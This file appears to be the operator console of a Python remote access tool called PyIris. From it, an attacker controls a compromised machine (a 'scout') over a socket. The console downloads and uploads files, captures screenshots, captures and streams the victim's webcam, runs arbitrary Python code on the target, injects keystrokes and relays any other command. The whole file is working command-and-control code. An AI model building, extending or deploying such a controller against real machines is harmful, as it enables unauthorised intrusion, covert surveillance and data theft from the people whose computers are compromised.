import socket
import readline
import library.commands.global_interface.clear as clear
import library.commands.global_interface.quit as quit
import library.commands.global_interface.python as python
import library.commands.global_interface.local as local
import library.commands.direct_interface.python_execute_editor as python_execute_editor
import library.commands.direct_interface.download as download
import library.commands.direct_interface.upload as upload
import library.commands.direct_interface.screen as screen
import library.commands.direct_interface.python_execute_file as python_execute_file
import library.commands.direct_interface.webcam as webcam
import library.commands.direct_interface.ping as ping
import library.commands.direct_interface.webcam_stream as webcam_stream
import library.modules.recv_all as recv_all
import library.modules.send_all as send_all
import library.modules.config as config
import library.modules.send_and_recv as send_and_recv


config.main()

valid_keys =  """   '\\t', '\\n', '\\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
   ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
   '8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
   'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
   'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
   'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
   'browserback', 'browserfavorites', 'browserforward', 'browserhome',
   'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
   'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
   'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
   'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
   'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
   'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
   'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
   'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
   'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
   'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
   'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
   'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
   'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
   'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
   'command', 'option', 'optionleft', 'optionright'
"""


def main(scout_id):
    readline.parse_and_bind('tab: self-insert')
    try:
        scout_id = scout_id.split(' ', 1)[1]
        scout_prompt = config.scout_database[scout_id][1] + ':' + config.scout_database[scout_id][2]
        print(config.pos + 'Bridged to : ' + scout_id)
    except (IndexError, KeyError):
        print(config.neg + 'Please enter a valid scout ID')
        return
    while True:
        try:
            prompt = input(
                '\x1b[1m\x1b[37mPyIris (\x1b[0m\x1b[1m\x1b[31m' + 'Scout\x1b[0m' + '\x1b[1m\x1b[37m@\x1b[0m\x1b[1m\x1b[31m' + scout_prompt + '\x1b[0m\x1b[1m\x1b[37m) > \x1b[0m').strip()
            command = prompt.split(' ', 1)[0].lower()
            if command == 'back':
                print(config.inf + 'Returning to scout interface...')
                return
            elif command == 'clear':
                clear.main()
            elif command == 'disconnect':
                print(send_and_recv.main(prompt, scout_id))
                del (config.scout_database[scout_id])
                print(config.inf + 'Returning...')
                return
            elif command == 'kill':
                print(send_and_recv.main(prompt, scout_id))
                del (config.scout_database[scout_id])
                print(config.inf + 'Returning...')
                return
            elif command in ('!', 'local'):
                local.main(prompt)
            elif command == 'main':
                print(config.inf + 'Returning to scout interface...')
                return 'home'
            elif command == 'python':
                python.main()
            elif command == 'quit':
                quit.main()
            elif command == 'sleep':
                data = send_and_recv.main(prompt, scout_id)
                print(data)
                if data.startswith('[*]'):
                    del (config.scout_database[scout_id])
                    print(config.inf + 'Returning...')
                    return
            elif command == 'download':
                send_all.main(config.scout_database[scout_id][0], prompt)
                download.main(config.scout_database[scout_id][0])
            elif command == 'upload':
                upload.main(config.scout_database[scout_id][0], prompt)
            elif command == 'screen':
                send_all.main(config.scout_database[scout_id][0], command)
                screen.main(config.scout_database[scout_id][0])
            elif command == 'webcam':
                send_all.main(config.scout_database[scout_id][0], command)
                webcam.main(config.scout_database[scout_id][0])
            elif command == 'webcam_stream':
                send_all.main(config.scout_database[scout_id][0], prompt)
                webcam_stream.main(config.scout_database[scout_id][0])
            elif command == 'ping':
                alive_bool = ping.main(scout_id)
                if not alive_bool:
                    print(config.inf + 'Returning...')
                    return
            elif command == 'exec_py_script':
                data = 'exec_py ' + python_execute_editor.main()
                print(config.inf + 'Attempting to run on scout...')
                print(send_and_recv.main(data, scout_id))
            elif command == 'exec_py_file':
                python_execute_file.main(prompt, scout_id)
            elif command == 'inj_valid':
                print('\n' + config.inf + 'All valid keys that can be injected : \n' + valid_keys)
            elif not command:
                pass
            else:
                send_all.main(config.scout_database[scout_id][0], prompt)
                data = recv_all.main(config.scout_database[scout_id][0])
                print(data)
        except KeyboardInterrupt:
            quit.main()
        except (socket.error, socket.timeout):
            print(config.neg + 'Scout has unexpectedly died, removing from database...')
            del (config.scout_database[scout_id])
            return
        except IndexError:
            print (config.neg + 'Please supply valid arguments for the command you are running')
